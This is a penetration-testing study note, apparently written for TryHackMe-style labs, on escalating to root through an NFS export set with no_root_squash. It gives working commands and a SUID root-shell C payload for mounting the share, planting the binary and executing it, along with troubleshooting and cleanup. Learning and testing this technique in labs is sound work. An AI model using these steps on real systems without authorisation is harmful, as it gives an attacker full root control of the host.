---
type: technique
platform: linux
status: working
fluency: guided
source: thm
updated: 2026-09-03
---

# NFS — no_root_squash

Every other Linux vector in this vault escalates *on* the target. This one does not. You are already root **on your own machine**, and a misconfigured [[Security-Terms#^nfs|NFS]] export carries that root across the network onto the target's disk.

```text
You cannot chown a file to root on the target.
You can chown a file to root on your attacking box.
no_root_squash makes those the same operation.
```

The file you write lands on the target owned by `root:root` with the SUID bit set. Running it there is not an exploit — it is [[Linux-SUID-Abuse]] behaving exactly as designed. The misconfiguration is upstream, in who was allowed to create the file.

## Why it works — three facts stacked

**1. Ownership is a number, not a name.** The inode stores `UID 0`, not the string `root`. `ls` resolves it through `/etc/passwd` for display. Ownership is therefore a value that travels with the file, including over a network filesystem.

**2. NFS trusts the [[Security-Terms#^uid|UID]] the client asserts.** There is no per-file authentication in NFSv3. The client says "this write is from uid 0" and the server decides what to do with that claim. That decision is the export option:

| Option | Server's response to a client claiming uid 0 | Result |
|---|---|---|
| `root_squash` | maps it to `nobody` (65534) | file lands as `nobody:nogroup` — useless |
| `no_root_squash` | accepts it | file lands as **`root:root`** |
| `all_squash` | maps *every* uid to `nobody` | closed |

*Squash* = flatten. `root_squash` flattens root down to nobody, and it is the **default**. `no_root_squash` has to be typed in deliberately.

**3. SUID runs as the file's owner, not the caller.** A `root:root` file with mode `4755` executed by an ordinary user runs with euid 0. Standard Linux behaviour, not a bug.

## Preconditions — all four

| # | Condition | Check |
|---|---|---|
| 1 | An export with **both** `rw` and `no_root_squash` | `cat /etc/exports` on the target |
| 2 | You are **root on your attacking machine** | you are, on Kali |
| 3 | NFS reachable — 111/tcp (rpcbind) and 2049/tcp | `nmap -p111,2049 TARGET` |
| 4 | The target does not mount that path `nosuid` | `mount` on the target |

Condition 4 is the quiet killer and most write-ups do not mention it. Condition 1 is two options, not one — `no_root_squash` on a read-only export is inert.

## 1 — Read the export table from the target

**Why now** — you have a shell on the target and you are looking for a way up that does not depend on anything installed there. One world-readable file says whether this whole vector exists, and it is the only place the squash setting is written down.

```bash
cat /etc/exports
```
```text
/tmp              *(rw,sync,insecure,no_root_squash,no_subtree_check)   <- usable
/mnt/sharedfolder *(rw,sync,insecure,no_subtree_check)                  <- no. squashed.
/backups          *(rw,sync,insecure,no_root_squash,no_subtree_check)   <- usable
```

- `no_root_squash` **and** `rw` on the same line → both are required. Either one alone is inert.
- `*` → the client whitelist. `*` is any host; a hostname or a [[Security-Terms#^cidr|CIDR]] here may exclude your box and is the reason a perfectly good-looking export refuses to mount.
- `insecure` → allows client source ports above 1024. Without it the client must bind a privileged port, which needs root on the client, which you have anyway.
- `sync` and `no_subtree_check` → performance and consistency options. Irrelevant here.

**What you will see**

- **Found** — a line carrying both `rw` and `no_root_squash`. Note the path exactly; you will mount that path, not a parent of it.
- **Empty** — a file that exists and holds only comments means the NFS server package is installed and nothing is exported. That is a clean negative and closes the vector.
- **Error** — `No such file or directory` means NFS is not configured on this host at all. `Permission denied` is unusual: `/etc/exports` is mode 644 because it is created by the package install and rarely tightened, so a denial suggests someone hardened this host deliberately.
- **Noise** — an export line is not proof the server is running, and `/etc/exports` is only re-read on `exportfs -ra`. A stale file can advertise an option the running server is not honouring, which is why step 4 verifies the result rather than trusting this file.

> [!important]
> `showmount -e` lists *which paths* are exported and to whom. It does **not** report `no_root_squash`. If you only have remote access you cannot know the vector is open until you write a file and check its owner — which is itself the test. Both views are needed, and neither replaces the other.

**Then** — a usable export goes to step 2 to be reached from your own machine. Nothing usable here closes this note; go back to [[Linux-Privilege-Escalation]] for the other categories. A readable `/etc/exports` you cannot correlate with an open port is still worth recording — the export may be reachable from a host you pivot to later.

## 2 — Confirm the share is reachable from your machine

**Why now** — the target's own view says the export exists. Your machine's view says whether you can reach it, and those are different questions: a firewall or a client whitelist closes this vector without changing a byte of `/etc/exports`.

```bash
nmap -p111,2049 -sV TARGET_IP
```

```bash
showmount -e TARGET_IP
```
```text
Export list for TARGET_IP:
/backups          *
/mnt/sharedfolder *
/tmp              *
```

- `-p111,2049` → rpcbind and nfs. 111 is the portmapper NFSv3 uses to find everything else; 2049 is NFS itself and is the only one NFSv4 needs.
- `-sV` → version detection, which distinguishes an NFSv3 server from an NFSv4-only one. That distinction decides whether `showmount` can answer at all.
- `showmount` needs `nfs-common` on Debian and Kali, or `nfs-utils` elsewhere.

**What you will see**

- **Found** — an export list naming the path you read in step 1, with a client spec that includes you.
- **Empty** — an empty export list while 2049 is open is the NFSv4 case: NFSv4 does not answer `showmount` at all. Mount blind with `-o vers=4` rather than concluding nothing is shared. This is the outcome most likely to be misread as a closed door.
- **Error** — `clnt_create: RPC: Program not registered` means rpcbind is answering but NFSv3 is not running: again, try NFSv4. A hang means 111 is filtered; skip `showmount` entirely and mount directly with `-o vers=4`, which does not use the portmapper.
- **Noise** — a path appearing in `showmount` says nothing about whether it is writable or squashed. Every entry here looks identical whether or not the vector is open.

**Then** — a reachable export goes to step 3. A filtered 2049 from your position but a readable export table on the target means the share is reachable from *somewhere*, which is a pivot question: [[Pivoting-and-Tunneling]].

## 3 — Mount it, as root on your own box

**Why now** — everything up to here was reconnaissance. This step is the one that makes the target's disk writable from a machine where you are root, and it is the whole mechanism in one command.

```bash
mkdir -p /tmp/nfsmount
```

```bash
mount -o rw TARGET_IP:/backups /tmp/nfsmount
```

- run it **as root on your own machine**. That is precondition 2, and it is not a convenience: the uid your client asserts is the uid you are running as, and the entire technique is asserting uid 0.
- `-o rw` → explicit. A share mounted read-only fails at the `chmod +s` step with an error that points at the file rather than at the mount.
- add `-o vers=4` when step 2 suggested NFSv4. Under NFSv4 the exported root is `fsid=0` and paths are relative to it, so `TARGET:/backups` may need to be `TARGET:/`.
- nothing is copied. This is a window onto the target's disk — a file written here is written *there*, immediately.

**What you will see**

- **Found** — the mount returns silently and `ls /tmp/nfsmount` shows the target's files. Silence is success for `mount`.
- **Empty** — a mount that succeeds onto an empty directory is normal and fine; the export may genuinely hold nothing yet.
- **Error** — three that matter and they mean different things. `mount.nfs: access denied by server` means the client spec in the export line excludes you, or the server is NFSv4-only. `mount: only root can do that` is precondition 2. `mount.nfs: failed to apply fstab options` is **also** precondition 2 — the message names `fstab`, which has nothing to do with anything you typed; it is what `mount` emits when an unprivileged user asks for options it will not grant. Do not go looking for a mount problem.
- **Noise** — a successful mount proves reachability and write access. It proves nothing about squashing, which is still unverified at this point.

**Then** — go to step 4, whose `ls -l` is the actual test for `no_root_squash`. An access denial sends you back to step 1 to re-read the client spec on the export line.

## 4 — Build the payload and verify the ownership

**Why now** — the mount succeeded, and this step does two jobs at once: it creates the SUID binary and it answers the only question that still matters. The `ls -l` at the end is the test for `no_root_squash`, and it is why this step exists rather than being part of the previous one.

```c
#include <unistd.h>
#include <stdlib.h>
int main(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```
```bash
cd /tmp/nfsmount
```

```bash
gcc nfs.c -o nfs -w -static
```

```bash
chmod +s nfs
```

```bash
ls -l nfs
```

- `-static` → links libc into the binary. The target's glibc is almost never the same as your attacking machine's, and a dynamically linked payload dies there with a linker error. This flag is not optional.
- check your own architecture first with `uname -m`. An [[Security-Terms#^x86-64|ARM]] host needs `x86_64-linux-gnu-gcc`, not `gcc`.
- `-w` → silences warnings from the implicit declarations. Cosmetic.
- `chmod +s` → sets SUID **and** [[Security-Terms#^sgid|SGID]].

> [!important]
> `setuid(0)` is what keeps the root. The SUID bit gives the process **euid 0** while **ruid** stays your target user. `system()` then starts `/bin/sh`, and a shell that sees euid different from ruid drops euid back to ruid — your root evaporates before `bash` opens. `setuid(0)` sets the *real* UID to 0 first, which is permitted because euid is already 0. With ruid == euid == 0 there is nothing left to drop. Same rule as [[Linux-PATH-Abuse#Why the privilege usually evaporates — and when it does not|PATH Abuse]] and [[Linux-SUID-Abuse#The rule that decides everything|SUID Abuse]].

**What you will see**

- **Found** — `-rwsr-sr-x 1 root root` on the `ls -l` line. **This is the confirmation that `no_root_squash` is real**, and it is the whole reason the step exists. Two `s` characters and the word `root` twice.
- **Empty** — no empty case; the file exists after `gcc` or the compile failed.
- **Error** — `nobody nogroup` instead of `root root` is not an error message but it is the failure: `no_root_squash` is not in effect on the export you actually mounted. Either you mounted a different path from the one you read, or the running config differs from `/etc/exports`. Trust this `ls -l`, not the file. `chmod: changing permissions: Operation not permitted` means the same thing one step earlier. `Read-only file system` means the export is not `rw`.
- **Noise** — a successful `gcc` and a successful `chmod` both look like progress and neither is the test. Read the owner column.

**Then** — `root root` goes to step 5. `nobody nogroup` closes this export: go back to the list from step 1 and try another one, and if there is no other, the vector is closed on this host.

## 5 — Unmount, then execute on the target

**Why now** — the binary is planted and root-owned. One ordering detail stands between you and the shell, and getting it wrong produces an error that looks like a permissions problem and is not.

```bash
cd / && umount /tmp/nfsmount
```

Leaving the share mounted while the target executes the binary gives `Text file busy`. The unmount is part of the exploit, not part of the cleanup.

```bash
cd /backups && ls -l && ./nfs && id
```

- both files appear on the target — the binary and the source — because there is only ever **one** copy. You were looking at the target's disk the whole time; nothing was transferred.
- run `id` from inside the resulting shell, not before it. The prompt changing is not the test.

**What you will see**

- **Found** — `uid=0(root) gid=0(root)`.
- **Empty** — no empty case.
- **Error** — four, and each names a different cause.
    - `Text file busy` (`ETXTBSY`) means the client still holds the file open: `cd /` and `umount` on the attacking box first. Compile, then unmount, then execute — in that order, every time.
    - `Permission denied` running a binary that is visibly `-rwsr-sr-x` is a `nosuid` mount on the target for that path (`mount | grep backups`), which is precondition 4 and a clean negative for that export.
    - `Exec format error` is an architecture mismatch — `file` on the planted binary is the ground truth, and a Kali VM on an Apple Silicon Mac is `aarch64` while most targets are `x86_64`, so the mismatch usually runs the opposite direction to what write-ups assume.
    - `./nfs` running with `id` still showing your own uid is the euid drop: the binary is planted correctly and the payload is wrong.
- **Noise** — the source file `nfs.c` sitting beside the binary looks like a leftover and is actually evidence the write landed. Remove both at the end.

Cross compiling, when `file` says the wrong architecture:

```bash
sudo apt install -y gcc-x86-64-linux-gnu
```

```bash
sudo x86_64-linux-gnu-gcc nfs.c -o nfs -w -static
```

```bash
sudo chmod +s nfs
```

**Then** — root goes to [[Shells]] for a stable TTY, then to cleanup below. A `nosuid` mount sends you back to the export list. An architecture mismatch is fixed by the block above and costs one round trip, which `file` on the attacking side before you switch terminals would have saved.

## Payload variants

| Payload | When |
|---|---|
| `system("/bin/bash")` plus `setuid(0)` | default, interactive |
| `execl("/bin/bash","bash","-p",NULL)` | avoids the shell-drop question entirely; `-p` keeps euid |
| copy the target's own `/bin/bash` into the share, `chown root`, `chmod +s`, then `bash -p` | no compiler needed on either side |
| a static reverse shell | when the target session is not interactive |

The third row is worth remembering: if `gcc` is missing on your machine, you can copy any target binary **out** through the share, set the bits on it, and copy it back. Architecture stops being a question, because the binary came from the target in the first place.

## Cleanup

**Why now** — you have root and the vector is spent, so the only thing still on the box is what you put there: a root-owned SUID binary sitting in a directory the whole network can mount. Do it now, while you still hold the root shell that makes removal a single command, rather than after the session drops and you have to re-run the exploit to clean up after the exploit.

```bash
rm /backups/nfs /backups/nfs.c
```

```bash
rmdir /tmp/nfsmount
```

- the two lines run on **different machines**. `/backups` is the target's path, removed from the root shell step 5 opened; `/tmp/nfsmount` is your own mountpoint, already unmounted at step 5.
- both files, not just the binary → `nfs.c` is the technique written out in source form for whoever reads the directory next.

A world-executable root SUID binary left in a shared folder is a durable backdoor for anyone else on that network, and it will be found. Remove it. Nothing else on the attacking machine was changed — the mount was transient and touched no config.

**What you will see**

- **Found** — silence from both commands, then `ls -l /backups` showing neither file. `rm` and `rmdir` say nothing when they succeed, so that `ls` is the confirmation; the absence of output is not.
- **Empty** — nothing left to remove because an earlier attempt already cleaned up. That is the answer you want, not a failure — confirm with `ls -l /backups` instead of re-running.
- **Error** — `rm: cannot remove '/backups/nfs': Permission denied` means you are typing in the target user's shell rather than the root one the binary opened; the file and its directory are both root-owned. `rmdir: failed to remove '/tmp/nfsmount': Device or resource busy` means the export is still mounted on your machine — `cd /` and `umount /tmp/nfsmount` first. `Directory not empty` on that same path is the same situation seen from the other side: you are looking at the target's files through a live mount.
- **Noise** — the root shell you are typing in was started *by* the binary you are deleting. Linux allows unlinking a running executable, so the shell survives and keeps working — a shell that still responds is not evidence the file is still there. Check with `ls`.

**Then** — a clean `/backups` closes the box: nothing you added outlives you, and the only weakness left on the host is the export's own. Skip it and you have published a root shell to every client that can mount that share — the next tester, and anyone already inside — which turns your finding into an incident you caused. If a removal fails, record the exact path in the write-up: an artefact you have flagged is recoverable, one you have forgotten is not. Then go to [[Linux-SUID-Abuse]] for the mechanism to describe in it.

## Reading the output

**Only one line in this whole note is the test.** Every step before step 4 can succeed on a host where the vector is closed: the export line can be stale, the mount can succeed, the compile can succeed. `ls -l` showing `root root` on the planted file is the first moment you know, and every earlier success is provisional until then.

**Two views, neither sufficient.** `/etc/exports` on the target tells you the squash setting and not the reachability; `showmount` from your machine tells you the reachability and not the squash setting. Working from one alone produces confident wrong conclusions in both directions.

**The failure messages point at the wrong things twice.** `failed to apply fstab options` means you are not root and has nothing to do with fstab. `Permission denied` on an obviously-SUID binary means `nosuid` and has nothing to do with the permissions you are looking at. Both cost an hour if taken at face value.

## Next

- [[Linux-SUID-Abuse]] — the mechanism the planted binary relies on, and the euid rule
- [[873-rsync]] — the other network share that hands out file writes with the wrong identity
- [[Shells]] — payload choice when the target session has no terminal
- [[2049-NFS]] — the reconnaissance before this note: what is exported, and reading it as a matched user id

## Gaps

- **No NFSv4 walkthrough.** `fsid=0`, pseudo-filesystem roots, and why `showmount` goes quiet are noted above but not worked through on a real host.
- **`all_squash` with `anonuid=0`** is an equivalent misconfiguration reached a different way — every client is squashed, but *to* uid 0. Not covered.
- **No enumeration-only path.** Everything here assumes an existing shell on the target to read `/etc/exports`. Landing this from purely remote access, where you must probe blind, is unwritten.
- **No compiler-free variant worked through.** Copying the target's own `/bin/bash` into the share sidesteps architecture entirely, but needs the export directory writable by your target user, which it often is not.
- Nothing on the defensive view: `root_squash` as the default, `nosuid` and `noexec` on export mounts, and what an NFS audit log shows when a uid-0 write arrives.
